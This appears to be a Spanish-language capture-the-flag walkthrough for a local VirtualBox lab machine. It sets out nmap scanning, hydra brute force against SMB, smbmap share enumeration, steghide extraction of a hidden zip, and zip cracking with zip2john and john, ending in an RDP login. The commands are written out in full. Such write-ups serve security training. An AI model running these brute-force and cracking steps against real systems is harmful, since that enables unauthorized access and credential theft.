User.txt
Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
    - ifconfig

Empezamos escaneado la red con nmap:
    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
 
Vemos que el servicio smb esta abierto. Probamos hacer un ataque de fuerza bruta a este servicio:
    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 

    - hydra -L names.txt -P passwords.txt IP smb

Y encontramos una credencial valida. Intentamos conectarnos con rdesktop, pero no deja.

Probamos a usar smbmap para ver si hay algun recurso comapartido al que tengamos acceso.
Ver carpetas compartidas:
    - smbmap -H IP -u user -p pass
        Vemoc que hay una carpeta llamada folder a la que tenemos acceso de lectura, miramos dentro.
    - smbmap -H IP -u user -p pass -r folder

Parece que hay una imagen, la descargamos para verla:
    - smbmap -H IP -u user -p pass --download path/file

Hacemos file image.jpeg, para ver si de verdad es una imagen y efectivamente es una imagen. La abrimos y no nos dice nada en especial.

Miramos los metadatos del archivo con exiftool, pero tampoco vemos nada interesante. 

Probamos a buscar archivos ocultos en la imagen:
    - steghide extract -sf image
y descubrimos un .zip oculto. Pero no podemo abrirlo porque se necesita una contraseña. Vamos a guardarnos el hash de la contraseña del zip y a crackearlo despues con john:
    - Obtener hash zip:
        zip2john secret.zip > hash

    - Romper hash:
        john -w passwords.txt hash


Conseguimos la contraseña y dentro hay una credencial. Nos conectamos con rdekstop usando esta nueva credencial.